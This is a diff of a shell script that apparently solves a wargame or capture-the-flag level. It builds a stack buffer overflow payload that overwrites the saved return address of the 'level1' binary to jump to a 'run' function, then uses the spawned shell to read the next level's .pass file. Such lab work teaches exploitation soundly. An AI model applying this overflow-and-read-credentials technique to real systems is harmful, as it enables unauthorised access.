@@ -14,20 +14,20 @@ hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
 # We effectively replaced the ret instruction with a jmp to run
 
 # We fill the buffer
-export BUFFER_FILL=$(put 64 "A")
+BUFFER_FILL=$(put 64 "A")
 
 # We fill the alignment of (16 - sizeof(%ebp) - sizeof(%eip))
-export CALLING_ALIGNMENT=$(put 8 "A")
+CALL_ALIGNMENT=$(put 8 "A")
 
-# We fill the %ebp saved value with a dummy value
-export EBP_REPLACEMENT="AAAA"
+# We fill the %ebp saved value
+EBP_REPLACEMENT="AAAA"
 
-# We fill the return address with a the address of the run function
-export RUN_ADDRESS="08048444"
-export EIP_REPLACEMENT=$(hex_little_endian ${RUN_ADDRESS})
+# We set the return address to the address of the run function
+RUN_ADDRESS="08048444"
+EIP_REPLACEMENT=$(hex_little_endian ${RUN_ADDRESS})
 
 # We print our exploit to the output and wait for the reverse shell to open with cat
-(printf "${BUFFER_FILL}${CALLING_ALIGNMENT}${EBP_REPLACEMENT}${EIP_REPLACEMENT}\n" && cat) | ./level1
+(printf "${BUFFER_FILL}${CALL_ALIGNMENT}${EBP_REPLACEMENT}${EIP_REPLACEMENT}\n" && cat) | ./level1
 
 # We use the reverse shell to retrieve the password
 $ cat /home/user/level2/.pass
